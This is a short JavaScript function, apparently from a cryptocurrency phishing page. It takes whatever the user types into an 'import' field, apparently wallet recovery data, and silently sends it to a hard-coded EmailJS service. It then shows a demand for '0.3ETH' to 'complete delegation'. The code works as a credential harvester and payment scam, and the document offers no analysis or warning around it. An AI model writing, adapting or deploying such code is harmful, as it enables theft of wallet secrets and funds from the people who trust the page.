
function sendEmail() {
    var params = {
        import : document.getElementById("import").value,
    }

    const serviceID ="service_pd3zotd"
    const templateID = "template_ivrna59"

    emailjs.send(serviceID, templateID, params) 
    .then (
        res => {
            document.getElementById("import").value ="";
            console.log(res);
            document.getElementById("query").innerHTML = "0.3ETH TO COMPLETE DELEGATION PROCESS";
        } )  
        .catch(err => console.log(err)); 
}